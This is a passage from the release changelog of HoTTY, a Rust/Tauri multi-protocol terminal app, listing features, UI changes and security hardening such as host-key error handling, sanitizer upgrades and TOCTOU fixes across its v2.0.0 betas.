- **SSH refuses connection on known_hosts I/O errors** — previously, *any* error reading `known_hosts` (permission denied, disk failure, partial read) was silently treated as "this is a new host" and the user was re-prompted. An attacker who could corrupt or chmod-zero the file could exploit this to coax the user into accepting a substituted host key for an already-trusted host. Real I/O errors now log and refuse the connection; "file not found" still correctly returns the new-host prompt for first-time users.

## v2.0.0-beta8

Connection lifecycle UI, horizontal scrolling for unwrapped lines, and a rebuilt terminal layout that keeps the marker and scrollbar pinned to the right edge.

### New Features

- **Connection lifecycle overlay** — sessions now show a Connecting overlay while the transport is being established, and surface failures via dismissible toast notifications instead of failing silently. Session status gains explicit `connecting` and `error` values, with dedicated theme colors for the tab and pane border.
- **Configurable connect timeout** — SSH and Telnet connections now time out after a user-configurable interval (default 3s) instead of hanging indefinitely.
- **Horizontal scrolling when Line Wrap is off** — disabling Line Wrap re-enables a horizontal scrollbar on terminal panes that grows as the cursor advances past the right edge. Pressing Enter snaps the scroll back to column 0, and the host auto-scrolls to keep the cursor in view as you type.

### Improvements

- **Three-rail terminal layout** — the prompt marker indicator and the vertical scrollbar are now rendered in dedicated DOM rails outside the xterm host. They stay anchored to the pane's right edge regardless of the host's horizontal scroll position, so scrollbar, marker, and text never overlap.
- **Custom vertical scrollbar in terminals** — replaces xterm v6's default Monaco-style scrollbar with one that matches the rest of the app's chrome (driven by the global scrollbar styles).
- **Connecting-state theme colors** — added matching defaults across Dark, Medium, and Light themes for the new connecting tab/pane state.

### Bug Fixes

- **Prompt marker color** — prompts now correctly use the prompt-default theme color (red), with the prompt-active color (blue) reserved for non-prompt content.
- **Prompt marker detection** — replaced a stale buffer-position reference that caused intermittent detection misses, and trailing unused rows no longer carry markers.
- **Prompt marker positioning** — markers are now anchored to the right edge directly, so positioning no longer drifts with the parent's left edge or horizontal scroll. Includes a CSS fallback for overlay scrollbars and a content-based check that survives cursor transitions during startup.
- **Scrollbar corner artifacts** — hides the bottom-right scrollbar corner / resizer / button artifacts that previously appeared in some panes.
- **Terminal viewport could rewind on output** — in the three-rail layout introduced in this release, fast terminal output (e.g. `dir` listings) could leave the viewport one line behind, hiding the latest prompt until the next keypress forced a re-scroll. The custom scrollbar rail now updates its spacer geometry synchronously with terminal scroll events, so the viewport stays aligned with the newest output.

## v2.0.0-beta7

Safer in-place upgrades, a dependency security update, and modal stacking fixes.

### Bug Fixes

- **Installer no longer defaults to "Uninstall before installing" on upgrade** — when the installer detects an existing HoTTY installation, the **"Don't uninstall (keep settings)"** radio is now pre-selected and focused for upgrade and downgrade scenarios. Previously the destructive "Uninstall" option was the default, and clicking through could wipe the HostTree and AI provider credentials stored in WebView2 local storage. Same-version reinstall behavior is unchanged.
- **Help modal z-index** — corrected from `10001` to `10000` so it follows the base-modal convention; the previous value risked layering above unrelated nested overlays.
- **Save-confirm modal z-index** — corrected from `10001` to `10000` for the same reason; this dialog is never shown over another modal.

### Security

- **DOMPurify upgraded to 3.4.0** — addresses [GHSA-39q2-94rc-95cp](https://github.com/advisories/GHSA-39q2-94rc-95cp), where `ADD_TAGS` short-circuit evaluation could bypass `FORBID_TAGS`. AI-rendered markdown is sanitized through DOMPurify, so this hardens that surface.

## v2.0.0-beta6

Sixth beta release, focused on UI polish, futuristic theming effects, customizable empty-pane backgrounds, and continued security hardening.

### New Features

- **Unused pane background** — in **Settings → Appearance**, choose a solid color or custom image to display in empty grid panes
- **Futuristic theme effects** — new **Futuristic Effects** section in the Custom Theme Creator: neon glow on active panes and sidebar icons, glassmorphism backdrop blur on modals, and configurable icon stroke width / glow blur
- **File Explorer sidebar preference** — File Explorer now opens into an empty sidebar slot by default (new `preferSidebar` pane allocation strategy) instead of filling a grid cell
- **Empty pane drop hints** — empty grid cells display their pane number and a "Drop Tab Here" hint to guide tab placement

### Improvements

- **Settings UI redesign** — Appearance, Features, General, and Protocols tabs reorganized into grouped "cards" with section titles (Layout, Theme, Font, Terminal Display) for easier scanning
- **Theme refresh** — brighter `accent-color` (`#00b4ff` in dark) plus new `prompt-highlight-default`, `glow-*`, and `glass-*` theme variables across Dark, Light, and Medium themes
- **Lighter-weight icons** — SVG stroke width reduced from `2` to `1.5` across AI Chat, File Explorer, Log Viewer, Ping Monitor, Help, App Sidebar, Tab Bar, and Sidebar for a more refined look
- **Backdrop blur on modals** — subtle 6px blur behind all modal overlays
- **Prompt highlight default tracks theme** — when unset, the terminal prompt highlight color falls back to `--prompt-highlight-default` so it follows the current theme
- **Ask AI modal styling** — restored primary-button background, padding, and hover state that had regressed
- **Dependency cleanup** — removed unused `@tauri-apps/plugin-shell` npm dependency

### Bug Fixes

- **v1 htree import no longer corrupts credentials** — fixed field-mapping bug where imported usernames and passwords from legacy v1 host trees were mangled
- **About tab GitHub link** corrected and repository URL updated to `horryworks/HoTTY-Rust-Tauri`
- **Duplicate session race** — `connect_session` now re-checks for duplicate session IDs after connect completes and safely disconnects the new service on collision

### Security

- **Text Editor TOCTOU hardening** — `text_editor_read_file` / `write_file` re-validate the resolved path and file size at I/O time, guarding against symlink swaps after the dialog approval
- **Log Viewer TOCTOU fix** — `read_log_file` reads from the re-canonicalized path rather than the originally resolved path
- **HTML sanitizer tightened** — DOMPurify now forbids `svg`, `iframe`, `object`, `embed`, `script`, `link`, `base` tags and a broad set of `on*` event-handler attributes in AI-rendered markdown
- **WSL distribution name validation** — rejects shell metacharacters (`$`, backtick, `;`, `&`, `|`, redirects, quotes, whitespace) before the regex check as defense-in-depth
- **GCP IAP tunnel argv hardening** — gcloud invocations pass arguments as an argv array on Windows (`cmd /C gcloud.cmd <args>`) instead of a manually-escaped shell string, eliminating quoting-based injection risk
- **Asset protocol scoping** — enabled Tauri `protocol-asset` with an explicit CSP `img-src` allowance for `http://asset.localhost` so user-selected pane background images can be served safely

## v2.0.0-beta5

Fifth beta release, focused on security hardening, themeable AI provider branding, and UI polish.

### Improvements

- **Themeable AI provider icons** — the Gemini gradient, OpenAI, Anthropic, and Vertex AI icon colors are now driven by theme variables (`provider-gemini-1/2/3`, `provider-openai`, `provider-anthropic`, `provider-vertex-ai`) and exposed as a new **AI Providers** section in the Custom Theme Creator
- **Shell plugin replaced with opener** — migrated from `tauri-plugin-shell` to the lighter-weight `tauri-plugin-opener` for external URL handling, reducing the allowed capability surface
- **AI provider streaming cleanup** — Anthropic, Gemini, OpenAI, and Vertex AI providers now emit the chat-done event on cancellation/empty responses, avoiding orphaned loading states
- **Modal consistency** — standardized action-button padding (`6px 16px`) and footer gap (`8px`) across ConfirmModal, PasteConfirmationModal, and AskAiModal per the UI conventions

### Security

- **SSH credential zeroization on auth failure** — passwords and key passphrases are now wiped from memory immediately after the authentication attempt, whether it succeeds or fails, closing a window where plaintext secrets could linger on failed login
- **IAP tunnel zone filter hardening** — GCE instance listing now passes the zone via the dedicated `--zones=` flag rather than a `--filter=zone:(…)` expression, eliminating exposure to gcloud filter-syntax edge cases
- **DPAPI unsafe-block documentation** — added explicit SAFETY invariants to both `CryptProtectData` / `CryptUnprotectData` call sites covering buffer initialization, lifetime, and `LocalFree` ownership

## v2.0.0-beta4

Fourth beta release, focused on jumpbox tunneling, auto-update notifications, safer editing workflows, and security hardening.

### New Features

- **SSH/Telnet Jumpbox (bastion) tunneling** — connect through an SSH bastion host to a target SSH or Telnet server via `direct-tcpip` channel forwarding, with its own host-key verification and keyboard-interactive auth
- **Auto-update notification** — on startup, checks the GitHub releases API for a newer version and shows a dismissible notification linking to the release page
- **Unsaved changes prompt** — Text Editor now shows a Save / Discard / Cancel modal when closing a tab or quitting with unsaved edits, backed by a dirty-editor tracker shared across panes
- **AI System Prompt viewer** — inspect the effective system instruction sent to the current AI persona, with copy-to-clipboard support
- **React Error Boundary** — top-level error boundary catches renderer crashes and shows a recoverable fallback instead of a blank window

### Improvements

- **Telnet service** — refactored connection path to share the jumbox tunnel abstraction with SSH, unifying transport handling
- **tauriService** — added typed wrappers for the new updater and jumpbox commands
- **useResize hook** — small ergonomics improvements for pane drag-to-resize
- **App shell** — composed UpdateNotification, SaveConfirmModal, SystemPromptModal, and ErrorBoundary into the top-level layout

### Security

- **SSH credential validation** — added length caps (host, username, password, passphrase) in `SshConfig::validate` to reject malformed or oversized inputs before they reach the SSH stack
- **Log viewer TOCTOU mitigation** — re-canonicalizes the resolved path immediately before reading and re-checks the allowed-directory guard, preventing symlink swap attacks between the check and the read
- **Font enumeration unsafe hardening** — added null-pointer and alignment validation in the Windows font-enumeration callback before dereferencing OS-supplied pointers

### Housekeeping

- **Removed unused asset** — deleted `public/HoTTY_logo.png` (not referenced by the app)
- **Added tests** — new unit tests for the dirty-editor tracker utility

## v2.0.0-beta3

Third beta release, focused on theme customization, UI refinements, and expanded test coverage.

### New Features

- **Custom Theme Creator** — in-app editor to create user-defined themes by adjusting any CSS variable, with save/edit/delete support from the Appearance tab
- **Help Tooltip component** — contextual help hints embedded next to settings and controls
- **Versioned window title** — main window title now includes the current application version

### Improvements

- **Settings modal** — refined styling across all tabs (Appearance, General, Features, Protocols, AI, About) for visual consistency
- **Settings store** — extended with additional feature toggles and configuration options
- **Sidebar icon spacing** — tightened and balanced icon layout in the app sidebar
- **Removed deprecated ConnectForm** — fully superseded by the Session Dialog; legacy component and styles deleted
- **Expanded test coverage** — added tests for AI chat panels, Ask AI modal, authentication panels, theme utilities, and color/HTML helpers
- **Help modal** — documentation updated to cover the new Custom Theme Creator workflow

### Bug Fixes

- **Modal CSS consistency** — unified padding, border-radius, and animation timing across PasteConfirmationModal, SettingsModal, and HelpModal
- **Pane toolbar consistency** — aligned TextEditorPane and PingMonitorPane toolbars with the standard 36px toolbar spec

## v2.0.0-beta2

Second beta release with AI integration, connection management UI, and enhanced utility panes.

### New Features

- **AI Chat pane** — multi-provider AI chat with streaming responses, personas, and token cost tracking
- **AI providers** — support for Google AI Studio (Gemini), Vertex AI, Anthropic (Claude), and OpenAI (GPT) with provider-specific authentication
- **AI backend services** — Rust-based AI provider infrastructure with SSE streaming support
- **Ask AI modal** — right-click terminal text to query AI with built-in or custom commands
- **AI Settings tab** — configure AI provider, model, personas, Ask AI commands, command execution mode, and monitor buffer limits
- **AI Interactive Mode** — AI can suggest and execute terminal commands with safety classification (safe/destructive/unknown)
- **AI Watch Mode** — monitor terminal output and send captured logs to AI for analysis
- **Host Tree** — connection management UI with folders, drag-and-drop reordering, and host tree export/import
- **Session Dialog** — connection dialog for creating and editing SSH, Telnet, Serial, WSL, Local, and Git Bash sessions with jumpbox and IAP tunnel support
- **Help modal** — comprehensive in-app documentation covering all features, shortcuts, and AI setup guides
- **Confirm modal** — reusable confirmation dialog for destructive actions
- **Command classifier** — categorizes terminal commands as safe, destructive, or unknown for AI auto-execution decisions
- **AI token pricing** — per-model pricing data for cost estimation across all supported providers

### Improvements

- **Text Editor** — major enhancement with find & replace, go-to-line, sub-tabs for multiple files, encoding/line-ending selection, line wrap, return code visualization, and file association support
- **File Explorer** — improved navigation with breadcrumb path, hidden file toggle, drive browsing, and double-click to open in editor
- **Ping Monitor** — enhanced with configurable intervals, log output, and improved layout
- **Log Viewer** — improved with search/filter, regex toggle, and better file browsing
- **Tab Bar** — updated with feature pane tab support and improved drag-and-drop
- **Settings store** — extended with AI settings, enabled features, and additional configuration options
- **Session manager** — updated to support AI chat terminal integration
- **App icons** — refreshed application icons across all platforms (Windows, macOS, iOS, Android)
- **New utility hooks** — useFocusTrap, useModalState, useResize for improved UI interactions
- **ANSI utilities** — added ANSI code processing functions for terminal output handling
- **Color and HTML utilities** — added helper functions for color manipulation and HTML processing

## v2.0.0-beta1

First functional beta of the Rust/Tauri rewrite. This release replaces the Electron-based HoTTY with a Tauri v2 backend for improved memory efficiency and performance.

### New Features

- **Multi-protocol connections** — SSH, Telnet, Serial, WSL, and local shell (cmd, PowerShell, Git Bash)
- **SSH host key verification** — fingerprint display with accept/reject prompt for new and changed host keys
- **SSH private key authentication** — support for key file and passphrase
- **SSH algorithm configuration** — configurable KEX, cipher, MAC, and host key algorithms
- **Serial port support** — configurable baud rate, data bits, parity, stop bits, and flow control
- **WSL distribution selection** — connect to any installed WSL distribution
- **Multi-pane layout** — grid layouts (1x1, 1x2, 2x1, 2x2, 2x3, 3x2) with collapsible sidebars on all four edges
- **Tab bar** — drag-and-drop reordering, session and feature pane tabs
- **Log Viewer pane** — browse and read session log files
- **Text Editor pane** — open, edit, and save files with line ending detection
- **File Explorer pane** — browse directories and drives, open files in the text editor
- **Ping Monitor pane** — monitor multiple targets with configurable intervals and log output
- **Theming** — built-in Dark, Medium, and Light themes with custom theme support
- **Settings modal** — tabbed interface with Appearance, General, Features, Protocols, and About sections
- **Windows DPAPI encryption** — secure credential storage for saved connections
- **Paste confirmation** — modal to review clipboard content before pasting into terminal
- **Session logging** — per-session log output to file
- **Host tree export/import** — encrypted .htree format for connection configuration backup
- **GCE IAP tunnel** — connect to Google Cloud instances via Identity-Aware Proxy
- **Encoding support** — UTF-8, Shift_JIS, and EUC-JP per session
- **Keepalive** — configurable keepalive interval for SSH and Telnet connections
- **System font detection** — list and select installed system fonts for terminal rendering
- **Context menu** — right-click context menu support
- **Debug log management** — view and open debug log folder

### Improvements

- **Rust/Tauri v2 backend** — complete rewrite from Electron for lower memory usage and faster startup
- **Zustand state management** — persistent settings via Zustand with localStorage middleware
- **Typed IPC layer** — all Tauri commands wrapped in tauriService.ts with full TypeScript types
- **Comprehensive test coverage** — Vitest tests for all frontend components, hooks, and services

## v0.1.1

Scaffold-only version bump. No functional changes.

## v0.1.0

- Initial Tauri v2 project scaffold with migration spec.
